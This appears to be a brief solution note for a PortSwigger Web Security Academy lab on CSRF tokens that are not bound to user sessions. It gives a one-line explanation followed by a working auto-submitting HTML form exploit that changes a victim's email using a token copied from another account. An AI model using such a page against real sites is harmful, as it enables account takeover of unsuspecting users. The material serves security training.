# [CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)

> the `csrf` token might not bound to the individual users, the only check is the presence of that token in the control pool, so the application maintains a global pool of tokens

```
<body>
  <script>
    const form = document.createElement("form");
    const email = document.createElement("input");
    const csrf = document.createElement("input");
    email.name = "email";
    email.value = "duck@quack";
    csrf.name = "csrf";
    csrf.value = "copied-token";
    form.method = "post";
    form.action = "https://xxx.web-security-academy.net/my-account/change-email";
    form.append(email);
    form.append(csrf);
    document.body.append(form);
    form.submit();
  </script>
</body>
```
